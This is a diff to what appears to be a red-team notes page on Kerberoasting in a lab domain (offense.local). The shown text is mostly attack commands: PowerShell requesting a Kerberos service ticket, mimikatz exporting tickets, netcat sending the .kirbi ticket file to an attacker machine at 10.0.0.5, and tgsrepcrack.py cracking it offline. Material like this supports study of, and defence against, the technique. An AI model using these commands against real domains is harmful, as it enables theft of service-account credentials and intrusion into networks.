@@ -6,17 +6,66 @@ description: Credential Access
 
 ## Execution
 
-```text
+Note the vulnerable domain member - a user account with `servicePrincipalName` attribute set:
+
+![](../.gitbook/assets/kerberoast-principalname.png)
+
+Attacker setting up an nc listener to receive a hash for cracking:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@local" %}
+```csharp
 nc -lvp 443 > kerberoast.bin
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Attacker retrieving a kerberos ticker for a user account with `servicePrincipalName` set to `HTTP/dc-mantvydas.offense.local`:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
+```csharp
 Add-Type -AssemblyName System.IdentityModel  
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/dc-mantvydas.offense.local"
-
-mimikatz # kerberos::list /export
-nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
-python2 tgsrepcrack.py pwd kerberoast.bin
-
-
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../.gitbook/assets/kerberoast-kerberos-token.png)
+
+Using kerberos to export the kerberos ticket for cracking:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
+```csharp
+mimikatz # kerberos::list /export
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../.gitbook/assets/kerberoast-exported-kerberos-tickets.png)
+
+Sending the exported ticket to attacking machine for offline cracking:
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
+```csharp
+nc 10.0.0.5 443 < C:\tools\mimikatz\x64\2-40a10000-spotless@HTTP~dc-mantvydas.offense.local-OFFENSE.LOCAL.kirbi
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Attacker can now try cracking the password for the the ticket
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@local" %}
+```csharp
+python2 tgsrepcrack.py pwd kerberoast.bin
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+![](../.gitbook/assets/kerberoast-cracked.png)
 
 ## Observations
 
